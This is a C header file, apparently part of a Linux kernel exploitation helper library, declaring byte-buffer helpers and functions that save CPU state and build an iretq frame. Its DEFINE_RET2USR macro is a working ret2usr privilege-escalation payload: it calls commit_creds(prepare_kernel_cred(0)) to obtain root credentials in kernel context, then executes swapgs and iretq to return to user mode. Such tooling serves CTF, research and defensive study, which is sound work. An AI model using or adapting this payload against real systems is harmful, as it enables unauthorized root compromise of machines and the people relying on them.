#pragma once
#include "bytes.h"

typedef struct {
  uint64_t cs;
  uint64_t ss;
  uint64_t sp;
  uint64_t flags;
} SavedState;

#ifdef __cplusplus
extern "C" {
#endif

SavedState save_state(void);

Bytes *flat(const Bytes *, ...);
Bytes *b_mul(const Bytes *, size_t n);
Bytes *b_xor(const Bytes *, ...);
uint64_t posmod(int64_t i, int64_t n);
Bytes *iretq_frame(SavedState, uint64_t rip);

#ifdef __cplusplus
}
#endif

#define DEFINE_RET2USR(func, state, pkc, cc, ret)                              \
  void func(void) {                                                            \
    void *(*__kpwn_internal_prepare_kernel_cred)(void *) =                     \
        (void *(*)(void *))pkc;                                                \
    void (*__kpwn_internal_commit_creds)(void *) = (void (*)(void *))cc;       \
                                                                               \
    __kpwn_internal_commit_creds(__kpwn_internal_prepare_kernel_cred(0));      \
                                                                               \
    __asm__ __volatile__(".intel_syntax noprefix;"                             \
                         "swapgs;"                                             \
                         "mov r15, %0;"                                        \
                         "push r15;"                                           \
                         "mov r15, %1;"                                        \
                         "push r15;"                                           \
                         "mov r15, %2;"                                        \
                         "push r15;"                                           \
                         "mov r15, %3;"                                        \
                         "push r15;"                                           \
                         "mov r15, %4;"                                        \
                         "push r15;"                                           \
                         "iretq;"                                              \
                         ".att_syntax;"                                        \
                         :                                                     \
                         : "r"(state.ss), "r"(state.sp), "r"(state.flags),     \
                           "r"(state.cs), "r"(ret));                           \
  }
